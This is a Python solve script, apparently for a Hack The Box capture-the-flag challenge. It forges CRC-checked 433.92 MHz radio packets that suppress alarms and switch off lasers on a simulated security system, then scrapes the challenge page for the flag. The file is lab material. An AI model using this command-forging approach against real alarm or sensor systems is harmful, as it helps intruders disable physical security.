#!/usr/bin/env python3
import requests
import struct
import time

def crc16_stm32(data, poly=0x1D0F):
    """CRC-16 según STM32"""
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'
s = requests.Session()
s.get(base_url)

# Prueba simple: solo comando + CRC
print("[*] Probando comandos simples con CRC...")

# Suprimir alarmas: 0xF1 + CRC
data = bytes([0xF1])
crc = crc16_stm32(data)
packet_suppress = (data + struct.pack('<H', crc)).hex().upper()
print(f"  Suppress: {packet_suppress}")

# Apagar láseres: 0xFF + CRC
data = bytes([0xFF])
crc = crc16_stm32(data)
packet_off = (data + struct.pack('<H', crc)).hex().upper()
print(f"  Turn Off: {packet_off}")

# Enviar suppress
print("\n[*] Enviando Suppress...")
r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': packet_suppress
})

time.sleep(2)

# Enviar turn off
print("[*] Enviando Turn Off...")
r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': packet_off
})

time.sleep(3)

# Verificar estado
print("\n[*] Verificando estado...")
r = s.get(base_url)

import re
# Buscar cambios
if 'text-danger' in r.text or 'text-secondary' in r.text:
    print("[+] ¡Cambio de estado detectado!")

# Buscar flag
flags = re.findall(r'HTB\{[^}]+\}', r.text)
if flags:
    print(f"\n{'='*60}")
    print("[SUCCESS] FLAG ENCONTRADA!")
    print(f"{'='*60}")
    for flag in flags:
        print(flag)
    print(f"{'='*60}")
else:
    # Ver sensor status
    sensor_match = re.search(r'Sensor Status.*?</table>', r.text, re.DOTALL)
    if sensor_match:
        print("\nSensor Status:")
        print(sensor_match.group())
